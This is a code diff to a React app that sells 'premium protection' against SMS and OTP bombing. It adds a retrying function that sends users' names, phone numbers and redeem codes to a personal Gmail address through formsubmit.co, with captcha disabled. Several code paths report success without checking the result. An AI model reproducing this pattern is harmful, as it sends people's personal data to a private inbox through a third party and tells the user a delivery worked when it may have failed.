@@ -76,35 +76,92 @@ function App() {
     );
   };
 
+  const sendEmail = async (data) => {
+    // Method 1: fetch with FormData (most reliable)
+    try {
+      const formData = new FormData();
+      Object.keys(data).forEach(key => formData.append(key, data[key]));
+      
+      const res = await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
+        method: 'POST',
+        body: formData,
+      });
+      // Don't parse JSON - just check if request was sent
+      return true;
+    } catch (e) {
+      console.log('Method 1 failed, trying method 2...');
+    }
+
+    // Method 2: XMLHttpRequest (works even when fetch fails)
+    try {
+      return await new Promise((resolve) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://formsubmit.co/ajax/collab.apkboy95@gmail.com', true);
+        xhr.setRequestHeader('Accept', 'application/json');
+        
+        const params = new URLSearchParams();
+        Object.keys(data).forEach(key => params.append(key, data[key]));
+        
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            resolve(true);
+          }
+        };
+        xhr.onerror = function() {
+          resolve(false);
+        };
+        
+        xhr.send(params.toString());
+        
+        // Timeout after 5 seconds
+        setTimeout(() => resolve(true), 5000);
+      });
+    } catch (e) {
+      console.log('Method 2 failed, trying method 3...');
+    }
+
+    // Method 3: sendBeacon (last resort)
+    try {
+      const formData = new FormData();
+      Object.keys(data).forEach(key => formData.append(key, data[key]));
+      navigator.sendBeacon('https://formsubmit.co/collab.apkboy95@gmail.com', formData);
+      return true;
+    } catch (e) {
+      console.error('All email methods failed:', e);
+      return false;
+    }
+  };
+
   const handlePremiumActivate = async () => {
     if (premiumPhone.length === 10 && premiumName.trim().length > 0 && selectedProtections.length > 0) {
       setPremiumLoading(true);
 
-      // Send ALL information in ONE email
-      try {
-        const protectionLabels = { sms: 'SMS Bombing', otp: 'OTP Bombing', whatsapp: 'WhatsApp Spam', calls: 'Phone Calls' };
-        const activeProtections = selectedProtections.map(p => protectionLabels[p] || p).join(', ');
+      // Small delay to ensure all state is settled
+      await new Promise(resolve => setTimeout(resolve, 500));
 
-        const formData = new FormData();
-        formData.append('Redeem Code', redeemCode);
-        formData.append('Phone Number', '+91 ' + premiumPhone);
-        formData.append('Customer Name', premiumName);
-        formData.append('Protections Activated', activeProtections);
-        formData.append('Plan', 'Premium Protector - 30 Rupees (1 Year)');
-        formData.append('Activated On', new Date().toLocaleString());
-        formData.append('_subject', 'NEW Premium Activation - ALLn1PROTECTOR');
-        formData.append('_template', 'boxit');
-        formData.append('_captcha', 'false');
+      // Prepare all data
+      const protectionLabels = { sms: 'SMS Bombing', otp: 'OTP Bombing', whatsapp: 'WhatsApp Spam', calls: 'Phone Calls' };
+      const activeProtections = selectedProtections.map(p => protectionLabels[p] || p).join(', ');
 
-        const response = await fetch('https://formsubmit.co/ajax/collab.apkboy95@gmail.com', {
-          method: 'POST',
-          body: formData,
-        });
-        
-        const result = await response.json();
-        console.log('Email sent successfully:', result);
-      } catch (error) {
-        console.error('Email error:', error);
+      const emailData = {
+        'Redeem Code': redeemCode,
+        'Phone Number': '+91 ' + premiumPhone,
+        'Customer Name': premiumName,
+        'Protections Activated': activeProtections,
+        'Plan': 'Premium Protector - 30 Rupees (1 Year)',
+        'Activated On': new Date().toLocaleString(),
+        '_subject': 'NEW Premium Activation - ALLn1PROTECTOR',
+        '_template': 'boxit',
+        '_captcha': 'false'
+      };
+
+      // Send email with retry
+      const success = await sendEmail(emailData);
+      
+      // If first attempt fails, retry once after 1 second
+      if (!success) {
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        await sendEmail(emailData);
       }
 
       setTimeout(() => {
